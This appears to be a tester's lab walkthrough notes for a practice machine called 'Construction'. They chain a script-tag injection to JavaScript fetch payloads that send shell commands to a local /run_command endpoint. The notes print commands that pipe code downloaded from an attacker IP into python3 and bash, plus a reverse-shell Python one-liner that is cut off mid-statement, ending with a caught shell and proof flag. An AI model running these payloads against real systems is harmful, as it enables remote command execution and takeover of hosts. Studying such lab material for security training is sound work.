command from copying and pasting from `network tools`

hitting run to generate `fetch`
![[Pasted image 20250512003138.png]]
populates the `run_command`
![[Pasted image 20250512003154.png]]
right click `copy` as fetch
```bash
fetch("http://192.168.187.88:3000/run_command", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "proxy-connection": "keep-alive",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://192.168.187.88:3000/a86e560601e532934118a125dca8a9a0fb26bc45adb3bb38a3772daa8ef248a3",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "cmd=ifconfig",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```
now we modify the `fetch` command to make it simpler, and see if we can curl ourselves to get `Command Injection` from the `localhost`
- we delete almsot everything to make it very simple and save it as `payload2.js`
```bash
fetch("http://localhost:3000/run_command", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "cmd=curl 192.168.45.181:8000/command_test",
  "method": "POST",
});
```
and use this to trigger it the same way as before `<script src="http://192.168.45.181:8000/payload2.js"></script>`
![[Pasted image 20250512004036.png]]
and was able to get `command` execution by testing curl
![[Pasted image 20250512004015.png]]
now we just need to pull over a reverse shell and execute it
creating `x.py`
```bash
┌──(root💀gobots)-[12May2025 04:42:29]-[/home/kali/SUT/Construction]
└─# cat x.py       
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.181",1234))
```
creating `cmdpayload.js` to execute `x.py` - didnt use this one but was viable
```bash
fetch("http://localhost:3000/run_command", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "cmd=curl 192.168.45.181:8000/x.py | python3",
  "method": "POST",
});
```
ended up using this to get a `bash` shell - `cmdpayload.js`
```bash
fetch("http://localhost:3000/run_command", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "cmd=curl 192.168.45.181:8000/x.sh | bash",
  "method": "POST",
});
```
![[Pasted image 20250512005630.png]]
executing with `<script src="http://192.168.45.181:8000/cmdpayload.js"></script>`
![[Pasted image 20250512005652.png]]
caught reverse shell and proof `c976efe9337e0497309617e0ec8f94b2`
![[Pasted image 20250512005714.png]]